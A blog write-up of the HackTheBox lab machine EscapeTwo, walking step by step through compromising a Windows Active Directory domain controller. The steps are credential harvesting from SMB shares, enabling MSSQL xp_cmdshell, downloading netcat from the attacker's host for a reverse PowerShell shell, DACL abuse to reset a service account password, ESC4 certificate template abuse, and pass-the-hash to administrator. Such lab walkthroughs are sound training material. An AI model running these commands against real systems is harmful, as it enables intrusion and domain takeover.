---
title: "HackTheBox - EscapeTwo"
author: Nasrallah
description: ""
date: 2025-15-23 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, activedirectory, ad, adcs]
img_path: /assets/img/hackthebox/machines/escapetwo
image:
    path: escapetwo.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[EscapeTwo](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/escapetwo) from [HackTheBox](https://hacktheboxltd.sjv.io/anqPJZ).

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Host is up (0.11s latency).                                                                  [35/1266]
Not shown: 988 filtered tcp ports (no-response) 
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-12 10:36:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-12T10:37:27+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb                           
| Not valid before: 2024-06-08T17:35:00                                                        
|_Not valid after:  2025-06-08T17:35:00                                                        
445/tcp  open  microsoft-ds?                                                                          
464/tcp  open  kpasswd5?               
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-12T10:37:27+00:00; 0s from scanner time. 
| ssl-cert: Subject: commonName=DC01.sequel.htb 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb 
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-01-12T10:37:27+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-12T08:54:31
|_Not valid after:  2055-01-12T08:54:31
| ms-sql-ntlm-info:                       
|   10.129.239.42:1433: 
|     Target_Name: SEQUEL    
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb                                                              
|     DNS_Computer_Name: DC01.sequel.htb                                                       
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763                                                              
| ms-sql-info:
|   10.129.239.42:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-12T10:37:27+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb 
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-12T10:37:27+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb 
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-12T10:36:48
|_  start_date: N/A

```

The target is an active directory domain controller, we were give the credentials `rose:KxEPkKe6R8su`.

The nmap scan revealed the domain `sequel.htb`, let's add that to `/etc/hosts` file.

### SMB

First thing I always like to start with is SMB, let's list shares.

```terminal
nxc smb sequel.htb -u rose -p KxEPkKe6R8su --shares --users                                  
SMB         10.129.34.67    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)                                 
SMB         10.129.34.67    445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su                  
SMB         10.129.34.67    445    DC01             [*] Enumerated shares                             
SMB         10.129.34.67    445    DC01             Share           Permissions     Remark            
SMB         10.129.34.67    445    DC01             -----           -----------     ------            
SMB         10.129.34.67    445    DC01             Accounting Department READ                        
SMB         10.129.34.67    445    DC01             ADMIN$                          Remote Admin      
SMB         10.129.34.67    445    DC01             C$                              Default share     
SMB         10.129.34.67    445    DC01             IPC$            READ            Remote IPC        
SMB         10.129.34.67    445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.34.67    445    DC01             SYSVOL          READ            Logon server shareH
SMB         10.129.34.67    445    DC01             Users           READ
```

We found `Accounting Department` share with read permission.

Let's connect to the share and see what's there.

```terminal
[★]$ smbclient //sequel.htb/'Accounting Department' -U rose
Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 11:52:21 2024
  ..                                  D        0  Sun Jun  9 11:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 11:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 11:52:07 2024

                6367231 blocks of size 4096. 871018 blocks available
smb: \> mget *.xlsx
Get file accounting_2024.xlsx? y
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (20.9 KiloBytes/sec) (average 20.9 KiloBytes/sec)
Get file accounts.xlsx? y
getting file \accounts.xlsx of size 6780 as accounts.xlsx (12.8 KiloBytes/sec) (average 16.7 KiloBytes/sec)
smb: \> exit
```

We found two excel files and downloaded them with `mget` command.

I tried opening the files but got an error.

>Xlsx files are just ZIP files, so you can simply unzip them right away using your favorite ZIP tool.
{: .prompt-info }

Let's unzip the files and inspect the output.

>sharedStrings.xml is a file in Excel's OpenXML format that stores unique strings used across the workbook to reduce duplication and save space. It maps these strings to indexes referenced in cells.
{: .prompt-info }

Print the file out we get this:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst
    xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24">
    <si>
        <t xml:space="preserve">First Name</t>
    </si>
    <si>
        <t xml:space="preserve">Last Name</t>
    </si>
    <si>
        <t xml:space="preserve">Email</t>
    </si>
    <si>
        <t xml:space="preserve">Username</t>
    </si>
    <si>
        <t xml:space="preserve">Password</t>
    </si>
    <si>
        <t xml:space="preserve">Angela</t>
    </si>
    <si>
        <t xml:space="preserve">Martin</t>
    </si>
    <si>
        <t xml:space="preserve">angela@sequel.htb</t>
    </si>
    <si>
        <t xml:space="preserve">angela</t>
    </si>
    <si>
        <t xml:space="preserve">0fwz7Q4mSpurIt99</t>
    </si>
    <si>
        <t xml:space="preserve">Oscar</t>
    </si>
    <si>
        <t xml:space="preserve">Martinez</t>
    </si>
    <si>
        <t xml:space="preserve">oscar@sequel.htb</t>
    </si>
    <si>
        <t xml:space="preserve">oscar</t>
    </si>
    <si>
        <t xml:space="preserve">86LxLBMgEWaKUnBG</t>
    </si>
    <si>
        <t xml:space="preserve">Kevin</t>
    </si>
    <si>
        <t xml:space="preserve">Malone</t>
    </si>
    <si>
        <t xml:space="preserve">kevin@sequel.htb</t>
    </si>
    <si>
        <t xml:space="preserve">kevin</t>
    </si>
    <si>
        <t xml:space="preserve">Md9Wlq1E5bZnVDVo</t>
    </si>
    <si>
        <t xml:space="preserve">NULL</t>
    </si>
    <si>
        <t xml:space="preserve">sa@sequel.htb</t>
    </si>
    <si>
        <t xml:space="preserve">sa</t>
    </si>
    <si>
        <t xml:space="preserve">MSSQLP@ssw0rd!</t>
    </si>
</sst>
```

After unzipping the `accounts.xlsx` file we find the file `xl/SharedStrings.xml` that has some passwords for us.

```text
0fwz7Q4mSpurIt99
Md9Wlq1E5bZnVDVo
MSSQLP@ssw0rd!
86LxLBMgEWaKUnBG
```

I guessed that this box would be similar to the previous one and have a foothold through the `mssql` service so I jumped right into that.

### MSSQL

We got credentials for what seems to be the mssql service `sa:MSSQLP@ssw0rd!`

We can connect to MSSQL using `impacket-mssqlclient`

```terminal
[★]$ impacket-mssqlclient sequel.htb/sa:'MSSQLP@ssw0rd!'@10.129.34.67                      
Impacket v0.11.0 - Copyright 2023 Fortra                                                       
                                                                                               
[*] Encryption required, switching to TLS                                                      
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master                                  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english                                                                                                                                   [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192                                   
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.                       
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.                     
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)                                           
[!] Press help for extra shell commands 
SQL (sa  dbo@master)>
```

Let's see if we can execute commands with `EXEC xp_cmdshell whoami`.

```terminal
SQL (sa  dbo@master)> EXEC xp_cmdshell 'whoami';
[-] ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

We got an error, let's now check if we have admin privileges `SELECT is_srvrolemember('sysadmin');`.

```terminal
SQL (sa  dbo@master)> SELECT is_srvrolemember('sysadmin');
     
-   
1   
```

It returned 1 which mean True. With that we can enable the `xp_cmdshell` to execute commands on the system.

```terminal
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
xp_cmdshell whoami;
```

Or simply with `enable_xp_cmdshell;`

```terminal
SQL (sa  dbo@master)> enable_xp_cmdshell;
[*] INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Now let's try executing the command again.

```terminal
SQL (sa  dbo@master)> EXEC xp_cmdshell 'whoami';
output           
--------------   
sequel\sql_svc   

NULL
```

## **Foothold**

For the foothold, we can upload netcat to the target and use that to get a shell.

First we execute the following command to upload the executable.

```shell
EXEC xp_cmdshell 'powershell -c Invoke-WebRequest -uri "http://10.10.16.40/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"';
```

Now we setup a listener and execute the following command.

```shell
EXEC xp_cmdshell 'powershell -c "C:\Windows\Temp\nc.exe -e powershell.exe 10.10.16.40 9001"';
```

```terminal
[★]$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.40] from (UNKNOWN) [10.129.239.42] 65118
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
sequel\sql_svc
PS C:\Windows\system32>
```

## **Privilege Escalation**

On the C drive we find a folder called `sql2019`, going to that folder find a configuration file with a password.

```terminal
PS C:\sql2019\ExpressAdv_ENU> cat sql-configuration.ini
cat sql-configuration.ini
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

We find the pass `WqSZAF6CysDQbGb3`, there is one user on the box with a home folder which is `ryan`, let's see if he uses that password.

```terminal
[★]$ evil-winrm -i sequel.htb -u ryan -p WqSZAF6CysDQbGb3       
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

We got it.

### Ryan -> ca_svc

Let's run bloodhound.

```terminal
[★]$ ./bloodhound.py -d sequel.htb -u rose -p KxEPkKe6R8su -ns 10.129.34.67 -dc sequel.htb -c all
INFO: Found AD domain: sequel.htb       
INFO: Getting TGT for user              INFO: Connecting to LDAP server: sequel.htb    
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains                   
INFO: Found 1 domains in the forest     
INFO: Found 1 computers                 
INFO: Connecting to LDAP server: sequel.htb    
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 10 users                    
INFO: Found 59 groups                   
INFO: Found 2 gpos                      
INFO: Found 1 ous                       
INFO: Found 19 containers               
INFO: Found 0 trusts                    
INFO: Starting computer enumeration with 10 workers                                                                                                                                           
INFO: Querying computer: DC01.sequel.htb
INFO: Done in 00M 24S       
```

![ryan](1.png)

We see that ryan has `WriteOwner` over user `ca_svc`, we can use that to change the user password using the following commands.

```shell
owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
net rpc password "ca_svc" 'Password123!' -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "sequel.htb"
```

```terminal
──╼[★]$ owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'                       
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                          
                                                                                               
[*] Current owner information below                                                     
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins                                                            
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb                                                                                                                           
[*] OwnerSid modified successfully!


──╼[★]$dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
                                                                                               
[*] DACL backed up to dacledit-20250111-213139.bak
[*] DACL modified successfully! 


──╼[★]$net rpc password "ca_svc" 'Password123!' -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "sequel.htb"
```

### ESC4

Now Let's enumerate for vulnerable certificates on the box.

```terminal
[★]$ certipy find -vulnerable -u ca_svc -p 'Password123!' -dc-ip 10.129.34.67 -stdout       
Certipy v4.8.2 - by Oliver Lyak (ly4k)                                                                                                                                                        
                       
[*] Finding certificate templates                                                              
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority                                                              
[*] Found 12 enabled certificate templates                                                     
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'                                                                                                                                                 
[*] Enumeration output:
Certificate Authorities                                                                        
  0                                                                                            
    CA Name                             : sequel-DC01-CA                                                                                                                                      
    DNS Name                            : DC01.sequel.htb                                                                                                                                     
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb                                                                                                                
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3                                                                                                                    
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00                                                                                                                           
    Certificate Validity End            : 2124-06-08 17:00:40+00:00                            
    Web Enrollment                      : Disabled                                                                                                                                            
    User Specified SAN                  : Disabled                                             
    Request Disposition                 : Issue                                                                                                                                               
    Enforce Encryption for Requests     : Enabled                                              
    Permissions                                                                                
      Owner                             : SEQUEL.HTB\Administrators                            
      Access Rights                                                                            
        ManageCertificates              : SEQUEL.HTB\Administrators                                                                                                                           
                                          SEQUEL.HTB\Domain Admins
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False 
    Any Purpose                         : False 
    Enrollee Supplies Subject           : False 
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False 
    Requires Key Archival               : False 
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions

```

We found the certificate `sequel-DC01-CA` vulnerable to [ESC4](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/)

```shell
certipy template -dc-ip 10.129.34.67 -u ca_svc -p 'Password123!' -template DunderMifflinAuthentication -target sequel.htb -save-old
certipy req -ca sequel-DC01-CA -dc-ip 10.129.34.67 -u ca_svc -p 'Password123!' -template DunderMifflinAuthentication -target sequel.htb -upn administrator@sequel.htb
certipy auth -pfx administrator.pfx
```

```terminal
──╼[★]$ certipy template -dc-ip 10.129.34.67 -u ca_svc -p 'Password123!' -template DunderMifflinAuthentication -target sequel.htb -save-old                                                  
Certipy v4.8.2 - by Oliver Lyak (ly4k)                                                                                                                                                        
                                                                                                                                                                                              
[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'                                                                                           
[*] Updating certificate template 'DunderMifflinAuthentication'                                                                                                                               
[*] Successfully updated 'DunderMifflinAuthentication'

──╼[★]$ certipy req -ca sequel-DC01-CA -dc-ip 10.129.34.67 -u ca_svc -p 'Password123!' -template DunderMifflinAuthentication -target sequel.htb -upn administrator@sequel.htb                
Certipy v4.8.2 - by Oliver Lyak (ly4k)                                                                                                                                                        
                                                                                                                                                                                              
[*] Requesting certificate via RPC                                                                                                                                                            
[*] Successfully requested certificate                                                                                                                                                        
[*] Request ID is 5                                                                                                                                                                           
[*] Got certificate with UPN 'administrator@sequel.htb'                                                                                                                                       
[*] Certificate has no object SID                                                              
[*] Saved certificate and private key to 'administrator.pfx'

──╼[★]$ certipy auth -pfx administrator.pfx                                                                                                                                                  
Certipy v4.8.2 - by Oliver Lyak (ly4k)                                                                                                                                                        
                                                                                               
[*] Using principal: administrator@sequel.htb                                                                                                                                                 
[*] Trying to get TGT...                                                                                                                                                                      
[*] Got TGT                                                                                                                                                                                   
[*] Saved credential cache to 'administrator.ccache'                                           
[*] Trying to retrieve NT hash for 'administrator'                                                                                                                                            
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

We got the administrator's hash, now we can do pass-the-hash attack to get a shell as administrator.

```terminal
──╼[★]$ evil-winrm -i sequel.htb -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff   
                                         
Evil-WinRM shell v3.5
                                         
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                         
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
